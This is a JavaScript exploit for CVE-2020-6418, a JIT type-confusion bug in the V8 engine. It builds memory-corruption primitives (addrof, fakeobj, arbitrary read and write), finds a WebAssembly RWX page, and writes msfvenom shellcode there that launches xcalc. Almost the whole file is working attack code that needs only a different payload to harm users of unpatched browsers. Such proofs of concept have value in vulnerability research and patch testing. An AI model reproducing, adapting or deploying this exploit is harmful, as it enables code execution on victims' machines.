/* Exploit for CVE-2020-6418 by @ulexec
 * Tested with v8 commit 2dd34650e3ed0541e2025aaabd9fca88b92adba3
 */

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/*
 * We have to encapsulate the addrof and fakeobj primitives in Function objects
 * As the side-effect bug only gets trigger per each JIT function compilation. 
 * Therefore, we have to make TurboFan trigger the side-effect by generating a 
 * new set of JIT functions each time we want to leverage the fakeobj/addrof primitives.
*/
var counter = 0;

function addrof(obj) {
    counter += 1;   
    let x = new Function('obj', `
        let array = [1.1]; 

        function empty${counter}() {}

        function trigger${counter}(nt) { 
            let a = array.pop(Reflect.construct(empty${counter}, arguments, nt)); 
            for (var i = 0; i < 1000; i++) {}; 
            return a; 
        } 

        let proxy${counter} = new Proxy(Object, { 
            get: function() { 
                array[0] = obj; 
                return Object.prototype; 
            } 
        }); 

        function force_jit${counter}(o) { 
            for (var i = 0; i < 0x10000; i++) {}; 
            return trigger${counter}(o); 
        } 

        for (var i = 0; i < 0x10000; i++) {empty${counter}();} 


        force_jit${counter}(empty${counter}); 
        force_jit${counter}(empty${counter}); 

        return force_jit${counter}(proxy${counter});`
    )(obj);

    return x;
}


function fakeobj(addr) {
	counter += 1;
    let x = new Function('addr', `
        let array = [1.1];

        function empty2${counter}() {};

        function trigger2${counter}(new_target) {
            let a = array.push(typeof(Reflect.construct(empty2${counter}, arguments, new_target)) === Proxy ? 1.1 : addr);
            for (var i = 0; i < 1000; i++) {};
        }
            
        var proxy2${counter} = new Proxy(Object, {
            get: function() {
                array[0] = {};
                return Object.prototype;
            }
        });

        function force_jit2${counter}(func) {
            for (var i = 0; i < 0x10000; i++) {};
            trigger2${counter}(func);
        }

        for (var i = 0; i < 0x10000; i++) {empty2${counter}()};

        force_jit2${counter}(empty2${counter});
        force_jit2${counter}(empty2${counter});

        force_jit2${counter}(proxy2${counter});
        return array[3];`
    )(addr);
    return x;
}

/* This code here is to test that addrof and fakeobj primitives work correctly

let tmp_obj = {a:1, b:2};
let tmp_obj_addr = addrof(tmp_obj);
print("[+] Getting addrof 0x" + ftoi(tmp_obj_addr).toString(16));

let fake_obj = fakeobj(tmp_obj_addr);
if (fake_obj.d != tmp_obj.d || fake_obj.c !== tmp_obj.c) {
	print("[-] Objects don't match");
} else {
	print("[+] Fakeobj created sucessfully");
}

let tmp_obj2 = {a:1};
let tmp_obj_addr2 = addrof(tmp_obj2);
print("[+] Getting addrof 0x" + ftoi(tmp_obj_addr2).toString(16));

fake_obj = fakeobj(tmp_obj_addr2);
if (fake_obj.a != tmp_obj2.a) {
	print("[-] Objects don't match");
} else {
	print("[+] Fakeobj created sucessfully");
}
*/

var fake_map_obj = [
    itof(0n),                       // map root
    itof(0x1900042417080808n),      // flags
    itof(0x00000000084003ffn),      // flags 2
    itof(0n),                       // prototype
    itof(0n),                       // constructor_or_backpointer
    itof(0n),                       // raw_transitions
    itof(0n),                       // instance_descriptors
    itof(0n),                       // layout_descriptors
    itof(0n),                       // dependent_code
].slice(0);

let fake_map_obj_addr = addrof(fake_map_obj)-itof(0x48n);
console.log("[+] Fake array buffer map address: 0x" + ftoi(fake_map_obj_addr).toString(16));

let fake_arraybuffer_obj = [
    fake_map_obj_addr,          // map pointer
    itof(0n),                   // properties array
    itof(0n),                   // elements array
    itof(8n),                   // ArrayBuffer length
    itof(0n),                   // Backing store (not tagged)
    itof(0x2n),                 // Flags
    itof(0n)                    // Embedder
].slice(0);

/* Arbitrary read and write primitves are based on creating a fake ArrayBuffer instance
 * And modifying its backing pointer
 */

function arb_write4(addr, value) {
    function arb_write1(addr, value) {
        fake_arraybuffer_obj[4] = itof(addr);
        let fake_array_buffer_obj_addr = addrof(fake_arraybuffer_obj)-itof(0x38n);
        let fake_array_buffer = fakeobj(fake_array_buffer_obj_addr);
        dv = new DataView(fake_array_buffer);
        dv.setUint8(0, value);
    }

    for (let i = 0n; i < 4n; i++) {
        let v = Number(value & 0xff);
        arb_write1(addr + i, v);
        value = value >> 8;
    }
}

function arb_read(addr) {
    function arb_read1(addr) {
        fake_arraybuffer_obj[4] = itof(addr);
        let fake_array_buffer_obj_addr = addrof(fake_arraybuffer_obj)-itof(0x38n);
        let fake_array_buffer = fakeobj(fake_array_buffer_obj_addr);
        dv = new DataView(fake_array_buffer);
        return dv.getUint8(0);
    }
    
    let result = 0n;
    for (let i = 0n; i < 8n; i++) {
        let a = arb_read1(addr + i);
        result += ((BigInt(a) & 0xffn) << (8n * i));
    }
    return result;
}

function exploit() {
    // based on https://wasdk.github.io/WasmFiddle/
    // this is some 'container' code implementing a return 0 to force 
    // the creation of a RWX page. contents will be overwritten with shellcode
    var wasm_code = new Uint8Array([
        0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,
        128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,
        128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,
        101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,
        0,1,132,128,128,128,0,0,65,0,11]
    );
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    // retrieving entry-point of wasm instance
    var f = wasm_instance.exports.main;

    // retrieving rwx page base at offset 0x80 from wasm instance
    var wasm_instance_addr = BigInt(ftoi(addrof(wasm_instance)))
    console.log("[+] Wasm instance addr: 0x" + wasm_instance_addr.toString(16))
    var rwx_page_addr = arb_read(BigInt(ftoi(addrof(wasm_instance))) -1n + 0x80n);
    console.log("[+] RWX Wasm page: 0x"+ rwx_page_addr.toString(16));

    function copy_shellcode(addr, shellcode) {
        for (let i = 0; i < shellcode.length; i++) {
            arb_write4(addr, shellcode[i]);
            addr += 4n;
        }
    }

    // msfvenom -p linux/x64/exec CMD='xcalc' --format dword
    var shellcode=[                 
        0x90909090,
        0x90909090,
        0x782fb848,
        0x636c6163,
        0x48500000,
        0x73752fb8,
        0x69622f72,
        0x8948506e,
        0xc03148e7,
        0x89485750,
        0xd23148e6,
        0x3ac0c748,
        0x50000030,
        0x4944b848,
        0x414c5053,
        0x48503d59,
        0x3148e289,
        0x485250c0,
        0xc748e289,
        0x00003bc0,
        0x050f00
    ];
    copy_shellcode(BigInt(rwx_page_addr), shellcode);
    console.log("[+] Popping shell ...")
    f();
}

exploit();
